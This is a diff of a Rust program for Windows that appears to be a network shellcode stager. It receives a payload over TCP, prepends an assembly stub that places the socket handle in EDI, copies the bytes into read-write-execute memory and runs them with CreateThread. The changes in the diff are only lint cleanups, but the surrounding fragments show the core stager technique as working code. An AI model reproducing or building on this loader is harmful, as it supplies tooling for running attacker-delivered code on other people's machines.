@@ -5,6 +5,7 @@ use std::net::{TcpListener, TcpStream};
 use std::os::windows::io::AsRawSocket;
 use std::{mem, ptr};
 
+#[allow(clippy::wildcard_imports)]
 use windows::Win32::System::{Memory::*, Threading::*};
 
 /// Implement the main logic of the program
@@ -42,6 +43,7 @@ fn payload_recv(stream: &TcpStream) -> Result<Vec<u8>, Box<dyn Error>> {
 
     // Prepend some ASM to MOV the socket handle into EDI
     // MOV EDI, 0x12345678 ; BF 78 56 34 12
+    #[allow(clippy::cast_possible_truncation)]
     let fd = stream.as_raw_socket() as u32;
     payload[0] = 0xbf;
     payload[1..5].copy_from_slice(&fd.to_le_bytes());
@@ -55,7 +57,7 @@ fn payload_recv(stream: &TcpStream) -> Result<Vec<u8>, Box<dyn Error>> {
 fn payload_exec(payload: &[u8]) {
     const MEM_COMMIT: u32 = 0x1000;
     const MEM_RESERVE: u32 = 0x2000;
-    const INFINITE: u32 = 0xFFFFFFFF;
+    const INFINITE: u32 = 0xFFFF_FFFF;
 
     // Get a pointer to RWX memory
     let ptr = unsafe {
@@ -73,7 +75,7 @@ fn payload_exec(payload: &[u8]) {
 
     // Copy and execute the payload
     unsafe {
-        ptr::copy_nonoverlapping(payload.as_ptr(), ptr as *mut u8, payload.len());
+        ptr::copy_nonoverlapping(payload.as_ptr(), ptr.cast::<u8>(), payload.len());
         #[allow(clippy::missing_transmute_annotations)]
         let _ = CreateThread(
             None,
